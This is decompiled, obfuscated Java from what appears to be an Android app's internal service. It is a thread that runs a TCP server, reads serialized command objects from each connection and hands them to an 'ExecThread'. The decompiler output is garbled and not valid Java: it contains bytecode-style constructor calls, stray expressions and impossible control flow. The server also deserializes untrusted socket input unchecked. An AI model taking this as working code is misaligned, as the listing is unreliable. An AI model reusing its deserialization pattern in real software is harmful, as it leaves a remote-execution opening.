package com.fx.socket;

import com.fx.socket.command.RemoteCheckTcpServerAvailable;
import com.fx.socket.command.RemoteCloseTcpServer;
import com.vvt.ak.a;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;

public class e
  extends Thread
{
  private static final boolean a;
  private static final boolean b;
  private static final boolean c;
  private ServerSocket d;
  private d e;
  private String f;
  private int g;
  private String h;
  
  static
  {
    boolean bool = a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      b = a.b;
      c = a.e;
      return;
    }
  }
  
  public e(String paramString1, String paramString2, int paramInt, d paramd)
  {
    this.h = paramString1;
    this.f = paramString2;
    this.e = paramd;
    this.g = paramInt;
    try
    {
      boolean bool1 = a;
      if (bool1) {}
      ServerSocket localServerSocket = new java/net/ServerSocket;
      localServerSocket.<init>(paramInt);
      this.d = localServerSocket;
      return;
    }
    catch (IOException localIOException)
    {
      boolean bool2 = c;
      if (bool2) {}
      FxSocketException localFxSocketException = new com/fx/socket/FxSocketException;
      localFxSocketException.<init>(localIOException);
      throw localFxSocketException;
    }
  }
  
  private void a(ObjectInputStream paramObjectInputStream, ObjectOutputStream paramObjectOutputStream, Socket paramSocket)
  {
    if (paramObjectInputStream != null) {}
    try
    {
      paramObjectInputStream.close();
      if (paramObjectOutputStream == null) {}
    }
    catch (IOException localIOException2)
    {
      try
      {
        paramObjectOutputStream.close();
        if (paramSocket == null) {}
      }
      catch (IOException localIOException2)
      {
        try
        {
          for (;;)
          {
            paramSocket.close();
            return;
            localIOException1;
          }
          localIOException2;
        }
        catch (IOException localIOException3)
        {
          for (;;) {}
        }
      }
    }
  }
  
  public void a()
  {
    boolean bool = b;
    if (bool) {}
    RemoteCloseTcpServer localRemoteCloseTcpServer = new com/fx/socket/command/RemoteCloseTcpServer;
    String str = this.f;
    int i = this.g;
    localRemoteCloseTcpServer.<init>(str, i);
    try
    {
      localRemoteCloseTcpServer.execute();
      return;
    }
    finally
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
  }
  
  public void run()
  {
    bool1 = true;
    f1 = Float.MIN_VALUE;
    if (bool1) {}
    for (;;)
    {
      try
      {
        localObject1 = this.d;
        localSocket = ((ServerSocket)localObject1).accept();
        if (localSocket == null)
        {
          bool2 = c;
          if (bool2) {}
          bool2 = a;
          if (bool2) {}
          localObject1 = this.d;
          if (localObject1 == null) {
            continue;
          }
          bool2 = a;
          if (!bool2) {}
        }
      }
      catch (Exception localException2)
      {
        Object localObject1;
        Socket localSocket;
        ObjectInputStream localObjectInputStream;
        ObjectOutputStream localObjectOutputStream;
        bool2 = c;
        if (bool2) {}
        localServerSocket = this.d;
        if (localServerSocket == null) {
          continue;
        }
        bool2 = a;
        if (bool2) {}
        try
        {
          localServerSocket = this.d;
          localServerSocket.close();
          bool2 = false;
          f2 = 0.0F;
          localServerSocket = null;
          this.d = null;
        }
        catch (IOException localIOException1)
        {
          bool2 = c;
        }
        if (!bool2) {
          continue;
        }
        continue;
        bool2 = c;
        if (!bool2) {
          continue;
        }
        continue;
        bool2 = c;
        if (!bool2) {
          continue;
        }
        continue;
      }
      finally
      {
        Object localObject4 = this.d;
        if (localObject4 == null) {
          continue;
        }
        boolean bool3 = a;
        if (!bool3) {
          continue;
        }
        try
        {
          localObject4 = this.d;
          ((ServerSocket)localObject4).close();
          bool3 = false;
          localObject4 = null;
          this.d = null;
        }
        catch (IOException localIOException3)
        {
          bool3 = c;
          if (!bool3) {
            continue;
          }
          continue;
        }
        throw ((Throwable)localObject2);
        bool3 = c;
        if (!bool3) {
          continue;
        }
        continue;
        boolean bool2 = bool1;
        float f2 = f1;
        continue;
      }
      try
      {
        localObject1 = this.d;
        ((ServerSocket)localObject1).close();
        bool2 = false;
        f2 = 0.0F;
        localObject1 = null;
        this.d = null;
        return;
      }
      catch (IOException localIOException2)
      {
        bool2 = c;
        if (!bool2) {
          continue;
        }
      }
    }
    localObjectInputStream = new java/io/ObjectInputStream;
    localObject1 = localSocket.getInputStream();
    localObjectInputStream.<init>((InputStream)localObject1);
    localObjectOutputStream = new java/io/ObjectOutputStream;
    localObject1 = localSocket.getOutputStream();
    localObjectOutputStream.<init>((OutputStream)localObject1);
    for (;;)
    {
      try
      {
        localObject3 = localObjectInputStream.readObject();
        localObject3 = (TcpSocketCmd)localObject3;
        bool2 = localObject3 instanceof RemoteCloseTcpServer;
        bool3 = localObject3 instanceof RemoteCheckTcpServerAvailable;
        if ((bool2) || (bool3))
        {
          bool3 = true;
          localObject4 = Boolean.valueOf(bool3);
          if (!bool2) {
            break label484;
          }
          bool2 = b;
          if (bool2) {}
          bool2 = false;
          f2 = 0.0F;
          localObject1 = null;
        }
      }
      catch (Exception localException1)
      {
        Object localObject3;
        bool2 = bool1;
        f2 = f1;
      }
      try
      {
        localObjectOutputStream.writeObject(localObject4);
        localObjectOutputStream.flush();
        a(localObjectInputStream, localObjectOutputStream, localSocket);
        bool1 = bool2;
        f1 = f2;
      }
      catch (Exception localException3)
      {
        ServerSocket localServerSocket;
        for (;;) {}
      }
      localObject1 = new com/fx/socket/f;
      localObject4 = this;
      ((f)localObject1).<init>(this, localObjectInputStream, localObjectOutputStream, localSocket, (TcpSocketCmd)localObject3);
      localObject4 = "ExecThread";
      ((f)localObject1).setName((String)localObject4);
      ((f)localObject1).start();
      bool2 = bool1;
      f2 = f1;
      continue;
      bool3 = c;
      if (bool3) {}
      a(localObjectInputStream, localObjectOutputStream, localSocket);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/fx/socket/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */